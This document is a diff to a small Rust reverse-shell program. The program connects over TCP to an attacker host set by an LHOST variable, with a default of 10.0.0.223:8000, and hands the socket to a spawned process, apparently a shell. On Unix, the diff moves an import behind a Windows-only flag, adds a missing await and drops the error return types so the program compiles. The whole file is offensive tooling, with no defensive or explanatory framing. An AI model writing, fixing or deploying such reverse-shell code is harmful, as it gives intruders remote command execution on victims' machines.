@@ -1,7 +1,9 @@
 use std::process::Stdio;
-use tokio::io;
 use tokio::net::TcpStream;
 use tokio::process::Command;
+
+#[cfg(windows)]
+use tokio::io;
 
 #[cfg(windows)]
 async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
@@ -29,7 +31,7 @@ async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::E
 }
 
 #[cfg(unix)]
-async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
+async fn establish_stream(stream: TcpStream) {
     use std::os::fd::{AsRawFd, FromRawFd};
     let fd = stream.as_raw_fd();
 
@@ -40,16 +42,15 @@ async fn establish_stream(stream: TcpStream) -> Result<(), Box<dyn std::error::E
         .spawn()
         .unwrap()
         .wait()
+        .await
         .unwrap();
-
-    Ok(())
 }
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
+async fn main() {
     let home = option_env!("LHOST").unwrap_or("10.0.0.223:8000");
 
     let s = TcpStream::connect(home).await.unwrap();
 
-    establish_stream(s).await
+    establish_stream(s).await;
 }
